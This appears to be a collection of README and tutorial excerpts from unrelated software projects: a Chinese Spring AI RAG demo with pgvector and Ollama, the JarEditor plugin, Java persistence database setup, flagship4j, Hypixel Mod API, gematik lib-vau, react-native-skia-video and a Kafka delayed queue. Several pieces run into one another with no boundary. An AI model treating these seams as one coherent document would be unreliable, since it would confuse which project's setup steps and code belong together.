this.customMetadata.put(CHARSET_METADATA, this.charset.name());
this.customMetadata.put(SOURCE_METADATA, this.resource.getFilename());

return List.of(new Document(document, this.customMetadata));
```

本次demo重新实现TXT的读取，根据回车符对文本内容进行分段，并采用窗口模式对分段内容进行文档划分，可以先复制TextReader代码，新建“ParagraphTextReader”实现类，部分实现代码如下：

```java
/**
* 默认窗口大小，为1
*/
private static final int DEFAULT_WINDOW_SIZE = 1;

/**
* 窗口大小，为段落的数量，用于滚动读取
*/
private int windowSize = DEFAULT_WINDOW_SIZE;

public static final String START_PARAGRAPH_NUMBER = ""startParagraphNumber"";
public static final String END_PARAGRAPH_NUMBER = ""endParagraphNumber"";

/**
* 读取文本内容,并根据换行进行分段,采用窗口模式,窗口为段落的数量
*
* @return 文档信息列表
*/
@Override
public List<Document> get() {
    try {

        List<Document> readDocuments = new ArrayList();
        String document = StreamUtils.copyToString(this.resource.getInputStream(), this.charset);

        // Inject source information as a metadata.
        this.customMetadata.put(CHARSET_METADATA, this.charset.name());
        this.customMetadata.put(SOURCE_METADATA, this.resource.getFilename());
		
        //文本内容根据回车符进行分段
        List<String> paragraphs = Arrays.asList(document.split(""\n""));

        //采用窗口滑动读取分段内容
        int startIndex = 0;
        int endIndex = startIndex + this.windowSize;
        if (endIndex > paragraphs.size()) {
            readDocuments.add(this.toDocument(paragraphs, startIndex + 1, paragraphs.size()));
        } else {
            for (; endIndex <= paragraphs.size(); startIndex++, endIndex++) {
                readDocuments.add(this.toDocument(ListUtil.sub(paragraphs, startIndex, endIndex), startIndex + 1, endIndex));
            }
        }
        return readDocuments;
    } catch (IOException e) {
        throw new RuntimeException(e);
    }
}

/**
 * 封装段落成文档
 * @param paragraphList 段落内容列表
 * @param startParagraphNum 开始段落编码
 * @param endParagraphNum 结束段落编码
 * @return 文档信息
 */
private Document toDocument(List<String> paragraphList, int startParagraphNum, int endParagraphNum) {
    Document doc = new Document(String.join(""\n"", paragraphList));
    doc.getMetadata().putAll(this.customMetadata);
    doc.getMetadata().put(START_PARAGRAPH_NUMBER, startParagraphNum);
    doc.getMetadata().put(END_PARAGRAPH_NUMBER, endParagraphNum);
    return doc;
}
```



构建文件上传接口用来接收TXT文件，部分代码如下:

```java
@PostMapping(""/upload"")
public ResponseEntity upload(@RequestBody MultipartFile file) {
    documentService.uploadDocument(file);
    return ResponseEntity.ok(""success"");
}
```



documentService服务中实现文件的上传解析,并使用spring ai中的VectorStore存储数据，部分代码如下:

```java
@Autowired
private VectorStore vectorStore;

private static final String PATH = ""D:\\demo\\ai\\path\\"";

/**
 * 使用spring ai解析txt文档
 *
 * @param file
 * @throws MalformedURLException
 */
public void uploadDocument(MultipartFile file) {
    //保存file到本地
    String textResource = file.getOriginalFilename();
    //判断文件是否是TXT
    if (!textResource.endsWith("".txt"")) {
        throw new RuntimeException(""只支持txt格式文件"");
    }
    String filepath = PATH + textResource;
    File file1 = new File(filepath);
    if(file1.exists()){
        throw new RuntimeException(""文件已存在"");
    }
    try {
        file.transferTo(file1);
    } catch (Exception e) {
        e.printStackTrace();
    }
    List<Document> documentList = paragraphTextReader(file1);
    vectorStore.add(documentList);
}

private List<Document> paragraphTextReader(File file) {
    List<Document> docs = null;
    try {
        //这里我们设置滑动窗口大小为5
        ParagraphTextReader reader = new ParagraphTextReader(new FileUrlResource(file.toURI().toURL()), 5);
        reader.getCustomMetadata().put(""filename"", file.getName());
        reader.getCustomMetadata().put(""filepath"", file.getAbsolutePath());
        docs = reader.get();
    } catch (Exception e) {
        e.printStackTrace();
    }
    return docs;
}
```



### 用户提问

用户提问需要先根据问题从向量库中搜索响应的段落，由于demo中文本解析使用滑动窗口的模型进行读取，这里需要对搜索结果进行一次合并，代码部分如下：

```java
/**
 * 合并文档列表
 * @param documentList 文档列表
 * @return 合并后的文档列表
 */
private List<Document> mergeDocuments(List<Document> documentList) {
	List<Document> mergeDocuments = new ArrayList();
	//根据文档来源进行分组
	Map<String, List<Document>> documentMap = documentList.stream().collect(Collectors.groupingBy(item -> ((String) item.getMetadata().get(""source""))));
	for (Entry<String, List<Document>> docListEntry : documentMap.entrySet()) {
		//获取最大的段落结束编码
		int maxParagraphNum = (int) docListEntry.getValue()
				.stream().max(Comparator.comparing(item -> ((int) item.getMetadata().get(END_PARAGRAPH_NUMBER)))).get().getMetadata().get(END_PARAGRAPH_NUMBER);
		//根据最大段落结束编码构建一个用于合并段落的空数组
		String[] paragraphs = new String[maxParagraphNum];
		//用于获取最小段落开始编码
		int minParagraphNum = maxParagraphNum;
		for (Document document : docListEntry.getValue()) {
			//文档内容根据回车进行分段
			String[] tempPs = document.getContent().split(""\n"");
			//获取文档开始段落编码
			int startParagraphNumber = (int) document.getMetadata().get(START_PARAGRAPH_NUMBER);
			if (minParagraphNum > startParagraphNumber) {
				minParagraphNum = startParagraphNumber;
			}
			//将文档段落列表拷贝到合并段落数组中
			System.arraycopy(tempPs, 0, paragraphs, startParagraphNumber-1, tempPs.length);
		}
		//合并段落去除空值,并组成文档内容
		Document mergeDoc = new Document(ArrayUtil.join(ArrayUtil.removeNull(paragraphs), ""\n""));
		//合并元数据
		mergeDoc.getMetadata().putAll(docListEntry.getValue().get(0).getMetadata());
		//设置元数据:开始段落编码
		mergeDoc.getMetadata().put(START_PARAGRAPH_NUMBER, minParagraphNum);
		//设置元数据:结束段落编码
		mergeDoc.getMetadata().put(END_PARAGRAPH_NUMBER, maxParagraphNum);
		mergeDocuments.add(mergeDoc);
	}
	return mergeDocuments;
}

/**
	 * 根据关键词搜索向量库
	 *
	 * @param keyword 关键词
	 * @return 文档列表
	 */
public List<Document> search(String keyword) {
    return mergeDocuments(vectorStore.similaritySearch(keyword));
}
```



接下来构建封装prompt和调用大模型的方法，代码部分如下:

```java
/**
 * 问答,根据输入内容回答
 * @param message 输入内容
 * @return 回答内容
 */
public String chat(String message) {
	//查询获取文档信息
	List<Document> documents = search(message);
	
	//提取文本内容
	String content = documents.stream()
			.map(Document::getContent)
			.collect(Collectors.joining(""\n""));
	
	//封装prompt并调用大模型
	String chatResponse = ollamaChatClient.call(getChatPrompt2String(message, content));
	return chatResponse;
}

/**
 * 获取prompt
 * @param message 提问内容
 * @param context 上下文
 * @return prompt
 */
private String getChatPrompt2String(String message, String context) {
	String promptText = """"""
			请用仅用以下内容回答""%s"":
			%s
			"""""";
	return String.format(promptText, message, context);
}
```



再构建一个接口用于用于提问，代码部分如下:

```java
@GetMapping(""/chat"")
public ResponseEntity chat(@RequestParam String message) {
    return ResponseEntity.ok(documentService.chat(message));
}
```



配置信息

最后需要配置文件中配置向量数据库、embedding和大模型chat信息，application.yml配置部分如下:

```yaml
spring:
  datasource:
    url: jdbc:postgresql://192.168.3.220:5432/postgres
    username: postgres
    password: postgres
  ai:
    vectorstore:
      pgvector:
      	##embedding的向量维度，这里的768是根据nomic-embed-text返回的向量维度配置的
        dimensions: 768
    ollama:
      base-url: http://localhost:11434
      chat:
        model: qwen:7b
      embedding:
        model: nomic-embed-text
```



测试embedding模型的向量维度可以写一个测试方法来获取，代码部分如下：

```java
@Autowired
private EmbeddingClient embeddingClient;

@Test
void embeddingDimensionsTest(){
    //打印embedding模型的转换向量的维度
	System.out.println(embeddingClient.dimensions());
}
```





## 测试

### 上传数据

准备了springAI简介信息作为测试数据[Spring AI :: Spring AI Reference](https://docs.spring.io/spring-ai/reference/index.html)，翻译如下：

```
Spring AI项目旨在简化包含人工智能功能的应用程序的开发，而不会造成不必要的复杂性。
该项目从著名的 Python 项目中汲取灵感，例如 LangChain 和 LlamaIndex，但 Spring AI 并不是这些项目的直接移植。 该项目成立的信念是，下一波生成式 AI 应用程序将不仅适用于 Python 开发人员，而且将在许多编程语言中无处不在。
Spring AI 的核心是提供抽象，作为开发 AI 应用程序的基础。 这些抽象具有多种实现，只需最少的代码更改即可轻松交换组件。
Spring AI 提供以下功能：
1.支持所有主要的模型提供商，如OpenAI，Microsoft，Amazon，Google和Huggingface。
2.支持的模型类型包括聊天和文本到图像，还有更多类型正在开发中。
3.跨 AI 提供商的可移植 API，用于聊天和嵌入模型。支持同步和流 API 选项。还支持下拉以访问特定于模型的功能。
4.将 AI 模型输出映射到 POJO。
5.支持所有主要的向量数据库提供商，例如 Azure Vector Search、Chroma、Milvus、Neo4j、PostgreSQL/PGVector、PineCone、Qdrant、Redis 和 Weaviate
6.跨 Vector Store 提供程序的可移植 API，包括一个类似 SQL 的新颖元数据过滤器 API，该 API 也是可移植的。
7.函数调用
8.用于 AI 模型和矢量存储的 Spring Boot 自动配置和启动器。
9.用于数据工程的 ETL 框架
通过此功能集，您可以实现常见用例，例如“文档问答”或“与文档聊天”。
概念部分提供了 AI 概念及其在 Spring AI 中的表示的高级概述。
“入门”部分介绍了如何创建第一个 AI 应用程序。 后续部分将采用以代码为中心的方法深入探讨每个组件和常见用例。
```



使用postman调用接口:

![postman测试文件上传](./img/postman测试文件上传.png)

本次demo使用向量数据库问pgvector，项目启动后，spring ai会连接pgvector自动创建vector_store表，当然也手动提前创建:

```sql
CREATE EXTENSION IF NOT EXISTS vector;
CREATE EXTENSION IF NOT EXISTS hstore;
CREATE EXTENSION IF NOT EXISTS ""uuid-ossp"";

CREATE TABLE IF NOT EXISTS vector_store (
	id uuid DEFAULT uuid_generate_v4() PRIMARY KEY,
	content text,
	metadata json,
	embedding vector(768) # 768 是embedding模型nomic-embed-text的维度
);

CREATE INDEX ON vector_store USING HNSW (embedding vector_cosine_ops);
```



测试过后可以连接数据库查询vector_store表的数据:

![pgvector数据查询](./img/pgvector数据查询.png)



### 问答测试

数据准备阶段已经测试完成，接下来可以测试问答，使用postman调用接口:

![postman测试问答](./img/postman测试问答.png)

*本地CPU运行大模型还是太慢了，一个接口跑了1分半多。*



## 总结

Spring AI结合Ollama和pgvector能很方便的构建一个RAG文档问答应用。RAG效果受到文档的拆分、embedding、段落搜索、prompt模板、大模型这些因素的影响，要想优化的话可以从这些方面去考虑。

IDEA plugin for modifying files in jar directly without decompression, including class and resource files.

**Plugin marketplace** : [https://plugins.jetbrains.com/plugin/24397-jareditor](https://plugins.jetbrains.com/plugin/24397-jareditor)

## Features
- Edit class/resource file in jar directly without decompression
- Add/Delete/Rename file/directory in jar
- Search the contents of the jar package
- Copy/Paste file/directory to/from clipboard
- Support SpringBoot jar/Nested jar
- Support kotlin
- Export source jar
- Support class bytes tool : javassist
- Decompilers : Fernflower/CFR/Procyon



## Quick start

### 1. Install plugin from marketplace
First install the plugin JarEditor from marketplace, IDEA at least version **2020.3**

<img src=""./img/JarEditor_install.png"" width=""800"" height=""606"" />


### 2. Edit and Build Jar
After installation , you can see a tab page to switch to Jar Editor in the .class decompiled file.

> **External jar** : File->Project Structure->Libraries->Add Library , then you can see the decompiled jar.<br>
> **Nested jar** : Right click on nested jar->JarEditor->Structure->Expand Nested Jar

<img src=""./img/JarEditor_main.png"" width=""800"" height=""506"" />

After modification, click **Save(Compile)** to compile and save the currently modified java content. 

Finally click **Build Jar** to write the compiled and saved class file into the Jar package.

Modifying the resource files in the jar package is also supported.

Here is an example:

<img src=""./img/JarEditor_demo.gif""  width=""800"" height=""511"" />

### 3. Class bytes tool
For obfuscated jars, the decompilation result is not satisfactory. In this case, you can use tools to directly modify the bytecode.
Click the **Class bytes tool** icon to select the tool

- **Javassist** : Field/method/constructor/static code can be modified/added/deleted (include inner class)


<img src=""./img/JarEditor_javassist.png"" width=""800"" height=""600"" />


### 4. Other operations of JarEditor
In the project view of the jar package, right-click to see **JarEditor->New/Delete** and other operations, where you can add/delete/rename/copy/paste/export files.

<img src=""./img/JarEditor_new_delete.png"" width=""600"" height=""550"" />


Click the **Search** icon to search the contents of the jar package. If it is a class jar, it will be searched based on the decompiled content.

<img src=""./img/JarEditor_search.png"" width=""600"" height=""470"" />

## Some mechanisms
- The JDK that the compilation depends on is the JDK of your SDK list. You can choose SDK and target version of the compiled class.
- The classpath you depend on when compiling java is the project's Libraries dependency. If the dependency package cannot be found, you can add Libraries(File->Project Structure->Libraries).
- Save(Compile) will save the modified files to the subdirectory **jar_edit_out** of the directory where the jar package is located. Build Jar will incrementally write the modified files to jar, and finally delete this directory.


### SDK Default Versions

When compiling and selecting **SDK Default**, the runtime JDK (JBR) integrated by Jetbrains is used. If SDK Default is not selected, the JDK installed by the specific user will be used.

## Java

All examples require at least Java 17 because of the awesome [Text Blocks](https://openjdk.java.net/jeps/355) feature, which makes JPQL and SQL queries so much readable.

## Maven

You need to use Maven 3.6.2 or newer to build the project.

## IntelliJ IDEA

On IntelliJ IDEA, the project runs just fine. You will have to make sure to select Java 17 or newer.

## Database setup

The project uses various database systems for integration testing, and you can configure the JDBC connection settings using the
`DatasourceProvider` instances (e.g., `PostgreSQLDataSourceProvider`).

### Manual Database configuration

- PostgreSQL

    You can install PostgreSQL, and the password for the `postgres` user should be `admin`.

    Now you need to create a `high_performance_java_persistence` database.
    
- Oracle

    You need to download and install Oracle XE

    Set the `sys` password to `admin`

    Connect to Oracle using the ""sys as sysdba"" user and create a new user:
    
        alter session set ""_ORACLE_SCRIPT""=true;

        create user oracle identified by admin default tablespace users;

        grant dba to oracle;

        alter system set processes=1000 scope=spfile;

        alter system set sessions=1000 scope=spfile;
        
        ALTER PROFILE DEFAULT LIMIT PASSWORD_LIFE_TIME UNLIMITED;

    Open the `C:\app\${user.name}\product\21c\homes\OraDB21Home1\network\admin` folder where `${user.name}` is your current Windows username.
  
    Locate the `tnsnames.ora` and `listener.ora` files and change the port from `1522` to `1521` if that's the case. If you made these modifications,
    you need to restart the `OracleOraDB21Home1TNSListener` and `OracleServiceXE` Windows services.
  
- MySQL

    You should install MySQL 8, and the password for the `mysql` user should be `admin`.

    Now, you need to create a `high_performance_java_persistence` schema

    Besides having all privileges on this schema, the `mysql` user also requires select permission on `mysql.PROC`.
    
    If you don't have a `mysql` user created at database installation time, you can create one as follows:
    
    ````
    CREATE USER 'mysql'@'localhost';
    
    SET PASSWORD for 'mysql'@'localhost'='admin';
    
    GRANT ALL PRIVILEGES ON high_performance_java_persistence.* TO 'mysql'@'localhost';
    
    GRANT SELECT ON mysql.* TO 'mysql'@'localhost';
    
    FLUSH PRIVILEGES;
    ````

- SQL Server

    You can install SQL Server Express Edition with Tools. Choose mixed mode authentication and set the `sa` user password to `adm1n`.

    Open SQL Server Configuration Manager -> SQL Server Network Configuration and enable Named Pipes and TCP
    
    In the right pane of the TCP/IP option, choose Properties, then IP Addresses and make sure you Enable all listed IP addresses.
    You need to blank the dynamic TCP port value and configure the static TCP port 1433 for all IPs.
        
    Open SQL Server Management Studio and create the `high_performance_java_persistence` database
    
## Maven

> To build the project, don't use *install* or *package*. Instead, just compile test classes like this:
>
>    mvn clean test-compile
    
Afterward, just pick one test from the IDE and run it individually.

> Don't you run all tests at once (e.g. `mvn clean test`) because the test suite will take a very long time to complete.
>
> So, run the test you are interested in individually.

## Prerequisites

- Java 8 or later if you are a user.

## Getting started

There are many libraries we provide. Among them, we mostly recommend to use the flagship4j-openfeature-spring-boot-starter.
For other libraries and use cases, please refer to the [Examples](#Examples) and [Libraries](#Libraries)

### Use feature toggle via OpenFeature interface

#### maven
```xml
<dependency>
  <groupId>com.linecorp.flagship4j</groupId>
  <artifactId>flagship4j-openfeature-spring-boot-starter</artifactId>
  <version>${version}</version>
</dependency>
```

#### gradle
```groovy
dependencies {
    implementation ""org.springframework.boot:spring-boot-starter""
    implementation ""com.linecorp.flagship4j:flagship4j-openfeature-spring-boot-starter""
}
```

#### Config
please refer to [Configuration options](#Configuration-options)
```yaml
flagship4j:
  toggle:
    flagr:
      baseUrl: http://localhost:18000
      connectionTimeout: 30
      readTimeout: 30
      callTimeout: 30
      writeTimeout: 30
```

#### Code
```java

    private final Client client; // dependency injected by spring 
            
    ... other code
            
    ... someMethod(...) {
            Boolean isHelloWorldEnabled = client.getBooleanValue(""hello-world-enabled"", false);
            if (isHelloWorldEnabled) {
            System.out.println(""Hello World"");
        }   
    }
```

## Install to local Maven repository

- If you are developing flagship4j for your other application in local
- Perform following command to deploy to local maven repository (~/.m2/repository)

```sh
./gradlew clean build publishToMavenLocal
```

HypixelDev/ModAPI,master,"# Hypixel Mod API

The Hypixel Mod API is an implementation of custom packets for communicating with the Hypixel Server via plugin
messages.

## Mod Distributions

Official downloads of the Hypixel Mod API can be found on [Modrinth](https://modrinth.com/mod/hypixel-mod-api).
To install the mod, simply download the JAR file and place it in your mods folder.

Currently, the Hypixel Mod API supports the following mod loaders and versions:

- [Fabric Latest](https://github.com/HypixelDev/FabricModAPI)
- [Forge 1.8.9](https://github.com/HypixelDev/ForgeModAPI)

If there is significant demand, support for additional versions and loaders may be considered.

## Developer Usage

It is recommended to read over the [FAQ](https://github.com/HypixelDev/ModAPI/wiki/FAQ) on the GitHub Wiki before implementing the Mod API.

For using the Mod API you will need to add it as a dependency to your project. This can be done via the public
Hypixel Maven repository.

```xml

<repository>
    <id>Hypixel</id>
    <url>https://repo.hypixel.net/repository/Hypixel/</url>
</repository>
```

This repo can also be used with Gradle.

```gradle
repositories {
    maven { url 'https://repo.hypixel.net/repository/Hypixel/' }
}
```

You can then include the dependency in your project.

```xml

<dependency>
    <groupId>net.hypixel</groupId>
    <artifactId>mod-api</artifactId>
    <version>1.0.1</version>
</dependency>
```

```gradle
dependencies {
    implementation 'net.hypixel:mod-api:1.0.1'
}
```

Depending on your chosen mod loader, you will need to also include the `hypixel-mod-api` as a required dependency. For
example in Fabric you would include the following in your `fabric.mod.json` file.

```json
{
  ""depends"": {
    ""hypixel-mod-api"": "">=1.0.1""
  }
}
```

## Example Usage

Once you have the API added to your project you can start using it. Below are examples of sending server-bound packets,
as well as receiving client-bound packets.

### Sending a Hypixel Packet

```java
public class Example {
    public void sendPacket() {
        HypixelModAPI.getInstance().sendPacket(new ServerboundPartyInfoPacket());
    }
}
```

### Registering a packet handler

```java

public class Example {
    public void registerPacketHandler() {
        HypixelModAPI.getInstance().createHandler(ClientboundLocationPacket.class, packet -> {
            packet.getServerName();
        });
    }
}
```

### Subscribing to a packet event

If you wish to receive a specific event packet, you will need to subscribe to the event. Once subscribed you can
register a packet handler as normal (see example above).

```java
public class Example {
    public void subscribeToPacketEvent() {
        HypixelModAPI.getInstance().subscribeToEventPacket(ClientboundLocationPacket.class);
    }
}
```

Registering for an event packet is only required one time during the Minecraft client lifecycle. You can register for
event packets at anytime, including in your mod initialization code before the player has connected.

The implementation of the Mod API will automatically notify the server of any registered events when receiving
the `ClientboundHelloPacket`.

gematik/lib-vau,main,"# VAU Library (lib-vau)

Dieses Repository dient als Beispielimplementierung in JAVA und implementiert den kryptografischen Teil der Spezifikation des VAU-Protokolls für ePA für alle ([gemSpec_Krypt Kaptiel 7](https://gemspec.gematik.de/docs/gemSpec/gemSpec_Krypt/latest/#7)). 

## Einschränkungen & Hinweise

- Es werden keine Zertifikate geprüft. 
- Es beinhaltet außerdem nur ECC, kein RSA.
- Der Transport der Daten der Public Keys geschieht über die binäre Codierung CBOR.
- Die kryptografischen Abhängigkeiten sind neben java.security auch Bouncy Castle.

> [!IMPORTANT]
> Die Implementierung mit BouncyCastle beinhaltet auch ein Workaround, welcher [implementiert](src/main/java/de/gematik/vau/lib/crypto/KyberEncoding.java) werden musste, damit diese kompatibel mit der Spezifikation wie in [Kapitel 7.1] beschrieben ist. Dies betrifft die Erzeugung von Kyber Schlüssel nach dem Kyber Release v3.0.2. In BouncyCastle wurde bereits die Draft Implementierung FIPS 203 umgesetzt, welche inkompatibel mit diesem Kyber Release ist. Dieser Workaround ist auf der folgenden Seite beschrieben worden:
> https://words.filippo.io/dispatches/mlkem768/#bonus-track-using-a-ml-kem-implementation-as-kyber-v3

## VAU Handshake
In der Datei [VauHandshakeTest.java](src/test/java/de/gematik/vau/VauHandshakeTest.java) befindet sich eine Beispielimplementierung des gesamten Handshakes wie er in der Spezifikation im [Kapitel 7.1](https://gemspec.gematik.de/docs/gemSpec/gemSpec_Krypt/latest/#7.1) beschrieben ist:

### VauMessage 1:
Der Client erzeugt die ECDH und Kyber KeyPairs. Diese werden in Message 1 gepackt und zum Server geschickt.

### VauMessage 2:
Der Server nimmt die VauMessage 1 entgegen. Die PublicKeys des Clients und seinen eigenen PrivateKeys nutzt er,
um die ECDH und Kyber Shared Secrets mitsamt Ciphertexts (KdfMessage) zu erstellen. Daraus erstellt er den ersten Schlüssel KdfKey1.
Diesen nutzt er, um seine signierten PublicKeys zu verschlüsseln. In VauMessage 2 werden die Ciphertexts der Shared
Secrets sowie die verschlüsselten signierten PublicKeys gespeichert und diese Nachricht wird zurück zum Client geschickt.

### VauMessage 3:
Der Client erhält VauMessage 2. Mithilfe der Ciphertexts des Servers und den eigenen PrivateKey erstellt er seine
eigenen Shared Secrets, mit welchen er den gleichen KdfKey1 wie der Server herleitet. Damit entschlüsselt er die signierten
PublicKeys des Servers. Mit diesen PublicKeys und den eigenen PrivateKeys erstellt der Client weitere Shared Secrets
mit zugehörigen Ciphertexts. Mit den Shared Secrets aus beiden Vorgängen wird nun ein KdfKey2 generiert, welcher für das
Ver-/Entschlüsseln zwischen Client und Server nach dem Handshake genutzt wird. Die Ciphertexts für den KdfKey2 werden mit
dem KdfKey1 verschlüsselt. Ein Transcript, was aus den bisherigen codierten Nachrichten besteht, wird in SHA-256 (=Hash) und dann mit
dem KdfKey2 verschlüsselt (=Ciphertext-KeyConfirmation). Die VauMessage 3 besteht aus den Ciphertexts und der Ciphertext-KeyConfirmation. Diese wird
zum Server zurückgeschickt.

### VauMessage 4:
Der Server öffnet VauMessage 4 und erhält mit seinem KdfKey1 die Ciphertexts. Mit diesen kann er nun seinen eigenen Shared Secrets
erstellen. Mit allen Shared Secrets leitet er, wie der Client zuvor, den KdfKey2 her. Um den Vorgang zu validieren, überprüft der
Server die Hash des Clients: Er entschlüsselt die Ciphertext-KeyConfirmation mit dem KdfKey2 und erhält den Client-Hash. 
Diese vergleicht er mit dem SHA-256 verschlüsselten eigenen Transcript. Den eigenen Hash verschlüsselt er mit dem KdfKey2 (=Ciphertext-KeyConfirmation).
Diese wird in VauMessage 4 gespeichert und zurück zum Client geschickt.

Der Client öffnet die Nachricht, entschlüsselt die Ciphertext-KeyConfirmation und vergleicht wieder den erhalten Hash mit selbst berechneten.
Erst dann ist der Handshake abgeschlossen.

AzzappApp/react-native-skia-video,main,"# React Native Skia Video

Video encoding/decoding support for [React Native Skia](https://github.com/Shopify/react-native-skia)

> ⚠️ This library is still a beta in a very unstable state

## Installation

```sh
npm install @azzapp/react-native-skia-video
```

## Usage

### VideoPlayer

The `useVideoPlayer` is a custom React hook used in the context of a video player component. This hook encapsulates the logic for playing, pausing, and controlling video playback. It returns a [Reanimated](https://docs.swmansion.com/react-native-reanimated/) shared value that holds the current frame of the playing video.

```js
import { Canvas, Image, Skia } from '@shopify/react-native-skia';
import { useVideoPlayer } from '@azzapp/react-native-skia-video';

const MyVideoPlayer = ({ uri, width, height }) =>{

  const { currentFrame } = useVideoPlayer({ uri })

  const videoImage = useDerivedValue(() => {
    const frame = currentFrame.value;
    if (!frame) {
      return null;
    }
    return Skia.Image.MakeImageFromNativeBuffer(frame.buffer);
  });

  return (
    <Canvas style={{ width, height }}>
      <Image image={videoImage} width={width} height={height}  />
    </Canvas>
  );
}

```

### VideoComposition

This library offers a mechanism for previewing and exporting videos created by compositing frames from other videos, utilizing the React Native Skia imperative API.

To preview a composition, use the `useVideoCompositionPlayer` hook:

```js
import { Canvas, Picture, Skia } from '@shopify/react-native-skia';
import { useVideoCompositionPlayer } from '@azzapp/react-native-skia-video'

const videoComposition = {
  duration: 10,
  items: [{
    id: 'video1',
    path: '/local/path/to/video.mp4',
    compositionStartTime: 0,
    startTime: 0,
    duration: 5
  }, {
    id: 'video2',
    path: '/local/path/to/video2.mp4',
    compositionStartTime: 5,
    startTime: 5,
    duration: 5
  }]
}

const drawFrame: FrameDrawer = ({
  videoComposition,
  canvas,
  currentTime,
  frames,
  height,
  width,
}) => {
  'worklet';
  const frame = frames[currentTime < 5 ? 'video1' : 'video2'];
  const image = Skia.Image.MakeImageFromNativeBuffer(frame.buffer);
  const paint = Skia.Paint();
  canvas.drawImage(image, 0, 0, paint)
}


const MyVideoCompositionPlayer = ({ width, height }) =>{
  const { currentFrame } = useVideoCompositionPlayer({
    composition: videoComposition,
    autoPlay: true,
    drawFrame,
    width,
    height,
  });

  return (
    <Canvas style={{ width, height }}>
      <Picture picture={currentFrame} />
    </Canvas>
  );
}
```

To export a composition, use the `exportVideoComposition` function:

```js
import { exportVideoComposition } from '@azzapp/react-native-skia-video'


exportVideoComposition(
  videoComposition,
  {
    outPath: '/path/to/output',
    bitRate: 3500000,
    frameRate: 60,
    width: 1920,
    height: 1080,
  },
  drawFrame
).then(() => {
  console.log('Video exported successfully!')
})
```

> Please note that the Video Composition system currently does not support sound.


### Video Capabilities (Android only)

On android you might needs to check the video capabilities of your device before exporting a video. This library provides 2 android specific functions for this purpose : 

#### getDecodingCapabilitiesFor(mimetype: string)

This function will returns the decoding capabilities of this device for the given mime type (most of the time you should check `video/avc`).

#### getValidEncoderConfigurations(width: number, height: number, frameRate: number, bitRate: number)

This function will returns a list of valid configuration in regards of your device encoding capabilities with the corresponding encoder.
If the provided parameters are not supported the returned configurations will be overridden with valid parameters (by decreasing, resolution, framerate or bitrate) while keeping the same aspect ratio.

cashfree/kafka-delayed-queue,main,"# Kafka Delayed Queue for Spring and Java

Kafka Delayed Queue is a library that facilitates delayed message processing in Kafka, tailored for Spring applications. This library leverages Kafka topics and scheduled tasks to efficiently manage and process delayed messages, ensuring high-throughput and reliable message handling.

## Features

- **Seamless Integration:** Easily integrate with Spring applications.
- **Configurable Delays:** Set customizable delay intervals for message processing.
- **High Throughput:** Optimized for handling large volumes of messages.
- **Scalable and Reliable:** Built on a robust architecture for scalability and reliability.

## Prerequisites

- **Java:** Version 8 or higher.
- **Apache Kafka:** Version 2.0.0 or higher.
- **Spring Boot:** Version 2.0 or higher.

## Getting Started

### 1. Create Kafka Topics
Create Kafka topics based on the formula: `2 * log2(MaxDelay)`. Ensure these topics are available in your Kafka cluster.

```shell
#!/bin/bash

# Check if the correct number of arguments are provided
if [ ""$#"" -ne 3 ]; then
    echo ""Usage: $0 <kafka_bin_path> <prefix> <n>""
    exit 1
fi

# Assign the arguments to variables
KAFKA_BIN_PATH=$1
PREFIX=$2
N=$3

# Loop through 1 to n and create topics
for (( i=1; i<=N; i++ ))
do
    DELAY_QUEUE_TOPIC=""${PREFIX}.delay-queue.delay-level-${i}""
    BITCHECK_QUEUE_TOPIC=""${PREFIX}.delay-queue.bitcheck-level-${i}""

    # Create delay queue topic
    ""${KAFKA_BIN_PATH}/kafka-topics.sh"" --create --topic ""${DELAY_QUEUE_TOPIC}"" --bootstrap-server localhost:9092 --partitions 1 --replication-factor 1
    if [ $? -ne 0 ]; then
        echo ""Failed to create topic: ${DELAY_QUEUE_TOPIC}""
    else
        echo ""Successfully created topic: ${DELAY_QUEUE_TOPIC}""
    fi

    # Create bitcheck queue topic
    ""${KAFKA_BIN_PATH}/kafka-topics.sh"" --create --topic ""${BITCHECK_QUEUE_TOPIC}"" --bootstrap-server localhost:9092 --partitions 1 --replication-factor 1
    if [ $? -ne 0 ]; then
        echo ""Failed to create topic: ${BITCHECK_QUEUE_TOPIC}""
    else
        echo ""Successfully created topic: ${BITCHECK_QUEUE_TOPIC}""
    fi
done

```

```commandline
./create_delay_kafka_topics.sh /usr/local/kafka/bin xyz 5
```

### 2. Install the Library
Download and install the JAR file from the Kafka Delayed Queue releases.

### 3. Enable Delayed Kafka Queue
Annotate your main application class or configuration class with `@EnableDelayKafkaQueue` to enable the delayed queue functionality.

### 4. Configure Kafka
Create a BaseKafkaConfig bean in your configuration file. Configure the topic prefix, maximum delay, and destination topic and Other Resources.

```java
@EnableKafka
@EnableDelayKafkaQueue
@Configuration
public class KafkaConsumerConfig extends BaseKafkaConfiguration {

  private final String kafkaBrokers;
  private final int kafkaConcurrency;
  private final String consumerGroup;
  private final Boolean sslEnabled;
  private final String trustStoreLocation;
  private final String trustStorePassword;
  private final String keyPassword;
  private final String keyStorePassword;
  private final String keyStoreLocation;
 ....

  @Bean
  public BaseKafkaConfig library() {
    BaseKafkaConfig baseKafkaConfig = new BaseKafkaConfig();
    baseKafkaConfig.setKafkaBrokers(this.kafkaBrokers);
    baseKafkaConfig.setConsumerGroup(this.consumerGroup);
    baseKafkaConfig.setSslEnabled(Boolean.FALSE);
    baseKafkaConfig.setKeyPassword(this.keyPassword);
    baseKafkaConfig.setKeyStoreLocation(this.keyStoreLocation);
    baseKafkaConfig.setKeyStorePassword(trustStorePassword);
    baseKafkaConfig.setTrustStoreLocation(trustStoreLocation);
    baseKafkaConfig.setTrustStorePassword(trustStorePassword);
    baseKafkaConfig.setMaxDelay(1000L);
    baseKafkaConfig.setTopicPrefix(""xyz"");
    baseKafkaConfig.setDestinationTopic(""xyz.delay-queue.final"");
    return baseKafkaConfig;
  }
}
```

### 5. Start Pushing Messages
Use the kafkaTemplate bean to start pushing messages into the queue.

```java
@Service
public class MessageProducer {
    
    
    private final KafkaTemplate<String, String> kafkaTemplate;

    private final KafkaDelayUtil kafkaDelayUtil;

    @Autowired
    public MessageProducer(
            KafkaTemplate<String, String> kafkaTemplate, KafkaDelayUtil kafkaDelayUtil) {
        this.kafkaTemplate = kafkaTemplate;
        this.kafkaDelayUtil = kafkaDelayUtil;
    }

    public void sendMessage(String message, long delay) {
        KafkaDelayedQueueMessage kafkaMsg = new KafkaDelayedQueueMessage();
        kafkaMsg.setDelay(duration.toSeconds());
        kafkaMsg.setMessage(message);
        kafkaMsg.setStartTime(LocalDateTime.now());
        kafkaMsg.setPushTime(LocalDateTime.now());

